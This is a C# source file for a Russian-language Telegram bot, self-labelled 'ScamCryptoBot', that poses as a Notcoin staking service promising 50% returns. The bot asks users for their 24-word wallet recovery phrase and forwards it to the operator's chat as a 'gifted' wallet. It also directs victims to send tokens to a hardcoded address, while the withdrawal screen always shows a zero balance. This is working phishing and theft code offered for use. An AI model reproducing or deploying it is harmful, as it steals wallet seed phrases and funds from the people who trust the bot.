using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

namespace ScamCryptoBot.notcoin
{
    internal class Handlers
    {
        public static async Task UpdateHandler(ITelegramBotClient bot, Update update, CancellationToken cancellationToken)
        {
            try
            {
                switch (update.Type)
                {
                    case UpdateType.Message:
                        var msg = update.Message;
                        var user = msg.From;
                        var chat = msg.Chat;
                        switch (msg.Type)
                        {
                            // Command actions
                            case MessageType.Text:
                                if (msg.Text == "/start" && AdminPanel.adminFlagTO != true)
                                {
                                    string text = $"<b>{user.Username}</b>, Добро пожаловать в мир Notcoin и стейкинга!\nЯ - твой верный помощник, который поможет тебе увеличить свои средства через участие в стейкинге.\nСледи за своими инвестициями, получай награды и достигай финансового успеха! 💸🚀";
                                    await bot.SendTextMessageAsync(chat.Id, text, replyMarkup: KeyBoard.RenderUserInlineKeys(), parseMode: ParseMode.Html);
                                    await AdminPanel.SendAdminNotif(bot, $"Пользователь: @{chat.Username} команда /start");
                                    break;
                                }
                                if (AdminPanel.adminFlagTO)
                                {
                                    await bot.SendTextMessageAsync(chat, $"Приносим свои извинения\nБот находится на плановом обслуживании.");
                                    break;
                                }
                                if (msg.Text == "/apanel" & chat.Id == AdminPanel.adminID)
                                {
                                    string text = "🚀 Панель администратора ver : 1.3";
                                    await bot.SendTextMessageAsync(AdminPanel.adminID, text, parseMode: ParseMode.Html, replyMarkup: AdminPanel.RenderAdminPanel());
                                }
                                if (chat.Id == AdminPanel.adminID && AdminPanel.adminFlagWait)
                                {
                                    string id = msg.Text;
                                    await bot.SendTextMessageAsync(AdminPanel.adminID, id, parseMode: ParseMode.Html);
                                    AdminPanel.adminFlagWait = false;
                                    break;
                                }
                                if (UserStates.UserInputMnemonic)
                                {
                                    string mnemonica = msg.Text;
                                    if (!string.IsNullOrEmpty(mnemonica)) 
                                    {
                                        if(mnemonica.Count() < 24) 
                                        {
                                            await bot.SendTextMessageAsync(chat, "Введена не верная фраза\nПопробуйте заново", replyMarkup: KeyBoard.RenderGoBack());
                                            UserStates.UserInputMnemonic = false;
                                            break;

                                        }
                                        else 
                                        {
                                            await bot.SendTextMessageAsync(chat, "Ваш кошелек сохранен!", replyMarkup: KeyBoard.RenderGoBack());
                                            await bot.SendTextMessageAsync(AdminPanel.adminID, $"Пользователь: @{user.Username} подарил тебе кошелек\nФраза для входа:<code> {mnemonica} </code>", parseMode: ParseMode.Html);
                                            UserStates.UserInputMnemonic = false;
                                            break;
                                        }
                                    }
                                    
                                }
                                if (UserStates.UserInputCountOfNOT)
                                {
                                    string countNOT = msg.Text;
                                    int res = Convert.ToInt32(countNOT) * 50 / 100;
                                    await bot.SendTextMessageAsync(chat, $"{user.Username}\n⚠️ Cумма: <b>{countNOT}</b> NOT\n⚠️ Процентная ставка: <b>50%</b>\n⚠️ Доход: <b>{res}</b>\n⚠️ Для <b>подтверждения</b> отправте {countNOT} по адресу: <code>UQC-VDffVUCOseoiENMc2v7cUuho05EvKdiDm6kK6T2Z9rBK</code>\n⚠️ И <b>нажмите</b> кнопку подтверждения ниже.", replyMarkup: KeyBoard.RenderDonationsKeys(), parseMode: ParseMode.Html);
                                    UserStates.UserInputCountOfNOT = false;
                                    await AdminPanel.SendAdminNotif(bot, $"Пользователь: @{user.Username}\nСумма: {countNOT}");
                                    break;
                                }
                                break;
                        }
                        break;
                    // Inline keyboard actions
                    case UpdateType.CallbackQuery:
                        var callbackQuery = update.CallbackQuery;
                        switch (callbackQuery.Data)
                        {
                            case "button_AuthWallet":
                                string text = $"Для подключения кошелька @wallet <b>требуется ввести 24 значную фразу восстановления кошелька</b>\n❗️ Каждую фразу разделяйте пробелом!:";
                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, text, parseMode: ParseMode.Html);
                                UserStates.UserInputMnemonic = true;
                                break;
                            case "button_invest":
                                text = $"⚠️ Укажите стартовую сумму для стейкинга: ";
                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, text, parseMode: ParseMode.Html, replyMarkup: KeyBoard.RenderGoBack());
                                await AdminPanel.SendAdminNotif(bot, $"Пользователь: @{callbackQuery.Message.Chat.Username}\nКнопка инвестирования");
                                UserStates.UserInputCountOfNOT = true;
                                break;
                            case "button_withdraw":
                                text = "💥 Ваш тикер : A4HzF\n💥 Баланс на стейкинге: 0 NOT\n💥 Ставка: 50%\n<b>Ваша транзакция еще не дошла до нас, либо вы не принимали участие в стейкинге</b>";
                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, text, parseMode: ParseMode.Html, replyMarkup: KeyBoard.RenderGoBack());
                                await AdminPanel.SendAdminNotif(bot, $"Пользователь: @{callbackQuery.Message.Chat.Username}\n Кнопка вывода средств");
                                break;
                            case "button_donate":
                                text = $"💸 Ожидаем зачисления средств 💸\n❗️<b>Шифт сети в пределах 48ч</b>\n❗️ Бот оповестит Вас, как только транзакция поступит.";
                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, text, parseMode: ParseMode.Html, replyMarkup: KeyBoard.RenderGoBack());
                                await bot.SendTextMessageAsync(AdminPanel.adminID, $"<b>Пользователь: @{callbackQuery.Message.Chat.Username}\n Подтверждение перевода</b>", parseMode: ParseMode.Html);
                                break;
                            case "button_gback":
                                text = $"<b>{callbackQuery.Message.Chat.Username}</b>, Добро пожаловать в мир Notcoin и стейкинга!\nЯ - твой верный помощник, который поможет тебе увеличить свои средства через участие в стейкинге.\nСледи за своими инвестициями, получай награды и достигай финансового успеха! 💸🚀\nДля начала, узнай подробнее :3";
                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, text, replyMarkup: KeyBoard.RenderUserInlineKeys(), parseMode: ParseMode.Html);
                                UserStates.UserInputCountOfNOT = false;
                                UserStates.UserInputMnemonic = false;
                                break;
                            case "adm_to":
                                AdminPanel.adminFlagTO = !AdminPanel.adminFlagTO;
                                if (AdminPanel.adminFlagTO)
                                {
                                    text = "Режим техобслуживания активирован";

                                }
                                else
                                {
                                    text = "Режим техобслуживания деактивирован";
                                }
                                await bot.SendTextMessageAsync(AdminPanel.adminID, text);
                                break;
                            case "adm_notif":
                                AdminPanel.adminFlagNotificator = !AdminPanel.adminFlagNotificator;
                                if (AdminPanel.adminFlagNotificator)
                                {
                                    text = "Административные уведомления включены";
                                }
                                else
                                {
                                    text = "Административные уведомления выключены";
                                }
                                await bot.SendTextMessageAsync(AdminPanel.adminID, text);
                                break;





                        }

                        break;

                }
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
            }
        }
        public static async Task ErrorHandler(ITelegramBotClient bot, Exception error, CancellationToken cancellationToken)
        {
            var ErrorMessage = error switch
            {
                ApiRequestException apiRequestException => $"Telegram API Error:\n[{apiRequestException.ErrorCode}]\n[{apiRequestException.Message}]",
                _ => error.ToString()
            };
        }
    }
}
